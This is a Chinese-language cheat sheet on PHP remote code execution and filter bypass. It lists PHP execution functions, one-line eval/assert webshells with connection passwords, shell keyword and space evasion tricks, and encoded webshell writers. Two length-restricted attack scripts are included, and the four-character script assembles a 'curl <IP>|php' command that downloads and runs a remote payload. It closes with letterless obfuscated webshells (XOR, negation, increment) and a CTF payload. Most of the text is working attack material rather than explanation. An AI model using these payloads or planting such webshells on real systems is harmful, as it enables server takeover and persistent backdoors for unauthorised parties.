# RCE绕过

## 命令执行

### system()

```php
#string system ( string $command [, int &$return_var ] )
#system()函数执行有回显,将执行结果输出到页面上
<?php
    system("whoami");
?>
```

### exec()

```php
<?php
	echo exec("whoami");
?>
```

### popen()

```php
#resource popen ( string $command , string $mode )
#函数需要两个参数,一个是执行的命令command,另外一个是指针文件的连接模式mode,有r和w代表读#和写.函数不会直接返回执行结果,而是返回一个文件指针,但是命令已经执行
<?php popen( 'whoami >> c:/1.txt', 'r' ); ?>

<?php  
$test = "ls /tmp/test";  
$fp = popen($test,"r");  //popen打一个进程通道  
  
while (!feof($fp)) {      //从通道里面取得东西  
 $out = fgets($fp, 4096);  
 echo  $out;         //打印出来  
}  
pclose($fp);  
?> 
```

### proc_open()

```php
resource proc_open ( 
string $cmd , 
array $descriptorspec , 
array &$pipes [, string $cwd [, array $env [, array $other_options ]]] 
)
#与Popen函数类似,但是可以提供双向管道
<?php  
$test = "ipconfig";  
$array =   array(  
 array("pipe","r"),   //标准输入  
 array("pipe","w"),   //标准输出内容  
 array("pipe","w")    //标准输出错误  
 );  
  
$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  
echo stream_get_contents($pipes[1]);    //为什么是$pipes[1],因为1是输出内容  
proc_close($fp);  
?> 
```

### passthru()

```php
#void passthru ( string $command [, int &$return_var ] )
<?php
	passthru("whoami");
?>
```

### shell_exec()

```php
#string shell_exec( string &command)
<?php
	echo shell_exec("whoami");
?>
```

### 反引号 `

```php
#shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体,当禁用shell_exec时,` 也不可执行
<?php
	echo `whoami`;
?>
```

### pcntl_exec()

```php
#void pcntl_exec ( string $path [, array $args [, array $envs ]] )
#path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本
#args是一个要传递给程序的参数的字符串数组.
#pcntl是linux下的一个扩展,需要额外安装,可以支持 php 的多线程操作.
#pcntl_exec函数的作用是在当前进程空间执行指定程序,版本要求：PHP > 4.2.0
<?php 
	pcntl_exec ( "/bin/bash" , array("whoami"));
?>
```

## 代码注入

### eval()

```php
#传入的参数必须为PHP代码,既需要以分号结尾.
#命令执行：cmd=system(whoami);
#菜刀连接密码：cmd
<?php @eval($_POST['cmd']);?>
```

### assert()

```php
#assert函数是直接将传入的参数当成PHP代码直接,不需要以分号结尾,当然你加上也可以.
#命令执行：cmd=system(whoami)
#菜刀连接密码：cmd
<?php @assert($_POST['cmd'])?>
```

### preg_replace()

```php
#preg_replace('正则规则','替换字符','目标字符')
#执行命令和上传文件参考assert函数(不需要加分号).
#将目标字符中符合正则规则的字符替换为替换字符,此时如果正则规则中使用/e修饰符,则存在代码执行漏洞.
preg_replace("/test/e",$_POST["cmd"],"jutst test");
```

### create_function()

```php
#创建匿名函数执行代码
#执行命令和上传文件参考eval函数(必须加分号).
#菜刀连接密码：cmd
$func =create_function('',$_POST['cmd']);$func();
```

### array_map()

```php
#array_map() 函数将用户自定义函数作用到数组中的每个值上,并返回用户自定义函数作用后的带有新值的数组. 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致.
#命令执行http://localhost/123.php?func=system   cmd=whoami
#菜刀连接http://localhost/123.php?func=assert   密码：cmd
$func=$_GET['func'];
$cmd=$_POST['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
echo $new_array;
```

### call_user_func()

```php
#传入的参数作为assert函数的参数
#cmd=system(whoami)
#菜刀连接密码：cmd
call_user_func("assert",$_POST['cmd']);
```

### call_user_func_array()

```php
#将传入的参数作为数组的第一个值传递给assert函数
#cmd=system(whoami)
#菜刀连接密码：cmd
$cmd=$_POST['cmd'];
$array[0]=$cmd;
call_user_func_array("assert",$array);
```

### array_filter()

```php
#用回调函数过滤数组中的元素：array_filter(数组,函数)
#命令执行func=system&cmd=whoami
#菜刀连接http://localhost/123.php?func=assert  密码cmd
$cmd=$_POST['cmd'];
$array1=array($cmd);
$func =$_GET['func'];
array_filter($array1,$func);
```

###　uasort()

```php
#php环境>=<5.6才能用
#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 .
#命令执行：http://localhost/123.php?1=1+1&2=eval($_GET[cmd])&cmd=system(whoami);
#菜刀连接：http://localhost/123.php?1=1+1&2=eval($_POST[cmd])   密码：cmd
usort($_GET,'asse'.'rt');
```

## 绕过方式

### 空格

```
#常见的绕过符号有：
$IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、

#$IFS在linux下表示分隔符,如果不加{}则bash会将IFS解释为一个变量名,加一个{}就固定了变量名,$IFS$9后面之所以加个$是为了起到截断的作用
```

### 命令分隔符

```
%0a  #换行符,需要php环境
%0d  #回车符,需要php环境
;    #在 shell 中,是”连续指令”
&    #不管第一条命令成功与否,都会执行第二条命令
&&   #第一条命令成功,第二条才会执行
|    #第一条命令的结果,作为第二条命令的输入
||   #第一条命令失败,第二条才会执行
```

### 关键字

假如过滤了关键字cat\flag,无法读取不了flag.php,又该如何去做

#### 拼接绕过

```
#执行ls命令：
a=l;b=s;$a$b
#cat flag文件内容：
a=c;b=at;c=f;d=lag;$a$b ${c}${d}
#cat test文件内容
a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$b test
```

#### 编码绕过

```
#base64
echo "Y2F0IC9mbGFn"|base64 -d|bash  ==> cat /flag
echo Y2F0IC9mbGFn|base64 -d|sh      ==> cat /flag
#hex
echo "0x636174202f666c6167" | xxd -r -p|bash   ==> cat /flag
#oct/字节
$(printf "\154\163") ==>ls
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
#i也可以通过这种方式写马
#内容为<?php @eval($_POST['c']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
```

#### 单引号和双引号绕过

```
c'a't test
c"a"t test
```

#### 反斜杠绕过

```
ca\t test
```

#### 通过$PATH绕过

```
#echo $PATH 显示当前PATH环境变量,该变量的值由一系列以冒号分隔的目录名组成
#当执行程序时,shell自动跟据PATH变量的值去搜索该程序
#shell在搜索时先搜索PATH环境变量中的第一个目录,没找到再接着搜索,如果找到则执行它,不会再继续搜索
echo $PATH 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
`echo $PATH| cut -c 8,9`t test
```

#### 通配符绕过

```
[…]表示匹配方括号之中的任意一个字符
{…}表示匹配大括号里面的所有模式,模式之间使用逗号分隔.
{…}与[…]有一个重要的区别,当匹配的文件不存在,[…]会失去模式的功能,变成一个单纯的字符串,而{…}依然可以展开
```

```
cat t?st
cat te*
cat t[a-z]st
cat t{a,b,c,d,e,f}st
```


### 限制长度

```
>a    #虽然没有输入但是会创建a这个文件
ls -t    #ls基于基于事件排序（从晚到早）
sh a    #sh会把a里面的每行内容当作命令来执行
使用|进行命令拼接    #l\ s    =    ls
base64    #使用base64编码避免特殊字符
```

#### 七字符限制

```
w>hp
w>1.p\\
w>d\>\\
w>\ -\\
w>e64\\
w>bas\\
w>7\|\\
w>XSk\\
w>Fsx\\
w>dFV\\
w>kX0\\
w>bCg\\
w>XZh\\
w>AgZ\\
w>waH\\
w>PD9\\
w>o\ \\
w>ech\\
ls -t|\
sh
```

翻译过来就是

> echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d > 1.php

脚本代码

```python
import requests
 
url = "http://192.168.1.100/rce.php?1={0}"
print("[+]start attack!!!")
with open("payload.txt","r") as f:
	for i in f:
		print("[*]" + url.format(i.strip()))
		requests.get(url.format(i.strip()))
 
#检查是否攻击成功
test = requests.get("http://192.168.61.157/1.php")
if test.status_code == requests.codes.ok:
	print("[*]Attack success!!!")
```

#### 四字符限制

```python
#-*-coding:utf8-*-
import requests as r
from time import sleep
import random
import hashlib
target = 'http://52.197.41.31/'
 
# 存放待下载文件的公网主机的IP
shell_ip = 'xx.xx.xx.xx'
 
# 本机IP
your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()
 
# 将shell_IP转换成十六进制
ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                     for i in shell_ip.split('.')])
 
reset = target + '?reset'
cmd = target + '?cmd='
sandbox = target + 'sandbox/' + 
    hashlib.md5('orange' + your_ip).hexdigest() + '/'
 
# payload某些位置的可选字符
pos0 = random.choice('efgh')
pos1 = random.choice('hkpq')
pos2 = 'g'  # 随意选择字符
 
payload = [
    '>dir',
    # 创建名为 dir 的文件
 
    '>%s>' % pos0,
    # 假设pos0选择 f , 创建名为 f> 的文件
 
    '>%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1,
    # 因为alphabetical序中t>s
 
    '>sl',
    # 创建名为 >sl 的文件；到此处有四个文件,
    # ls 的结果会是：dir f> kt- sl
 
    '*>v',
    # 前文提到, * 相当于 `ls` ,那么这条命令等价于 `dir f> kt- sl`>v ,
    #  前面提到dir是不换行的,所以这时会创建文件 v 并写入 f> kt- sl
    # 非常奇妙,这里的文件名是 v ,只能是v ,没有可选字符
 
    '>rev',
    # 创建名为 rev 的文件,这时当前目录下 ls 的结果是： dir f> kt- rev sl v
 
    '*v>%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ,* 看作通配符.前文也提过了,体会一下.
    # 这时pos2文件,也就是 g 文件内容是文件v内容的反转： ls -tk > f
 
    # 续行分割 curl 0x11223344|php 并逆序写入
    '>p',
    '>ph\',
    '>|\',
    '>%s\' % ip[8:10],
    '>%s\' % ip[6:8],
    '>%s\' % ip[4:6],
    '>%s\' % ip[2:4],
    '>%s\' % ip[0:2],
    '> \',
    '>rl\',
    '>cu\',
 
    'sh ' + pos2,
    # sh g ;g 的内容是 ls -tk > f ,那么就会把逆序的命令反转回来,
    # 虽然 f 的文件头部会有杂质,但不影响有效命令的执行
    'sh ' + pos0,
    # sh f 执行curl命令,下载文件,写入木马.
]
 
s = r.get(reset)
for i in payload:
    assert len(i) <= 4
    s = r.get(cmd + i)
    print '[%d]' % s.status_code, s.url
    sleep(0.1)
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print '[%d]' % s.status_code, s.url
print s.text
```

### 限制回显

#### 判断

```
#利用sleep判断
ls;sleep 3
#http请求/dns请求
http://ceye.io/payloads
```

#### 利用

```
#写shell(直接写入/外部下载)
echo >
wget
#http/dns等方式带出数据
#需要去掉空格,可以使用sed等命令
echo `cat flag.php|sed s/[[:space:]]//`.php.xxxxxx.ceye.io
```

### 无字母、数字getshell

#### 异或

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

简短写法

> "`{{{"^"?<>/"   //_GET

#### 取反

```php
<?php
$__=('>'>'<')+('>'>'<');//$__2
$_=$__/$__;//$_1

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});//$____=assert

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});//$_____=_POST

$_=$$_____;//$_=$_POST
$____($_[$__]);//assert($_POST[2])
```

简短写法

> ${~"\xa0\xb8\xba\xab"} //$_GET

#### 自增

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

#### 实例

```php
<?php
include'flag.php';

if(isset($_GET['code'])){
   $code=$_GET['code'];
   if(strlen($code)>50){
       die("Too Long.");
  }
   if(preg_match("/[A-Za-z0-9_]+/",$code)){
       die("Not Allowed.");
  }
   @eval($code);
}else{
   highlight_file(__FILE__);
}
//$hint = "php function getFlag() to get flag";
?> 
```

#### payload:

> code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag

```
$_="{{{"^"?<>/";=$_="GET";
${$_}[_](${$_}[__]);=$_GET[_]($_GET[__]);=getFlag($_GET[__])=getFlag(null);
这个 payload 的长度是 37 ,符合题目要求的 小于等于40 .另fuzz 出了长度为 28 的 payload ,如下：

$_="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$_();
#getFlag()
```
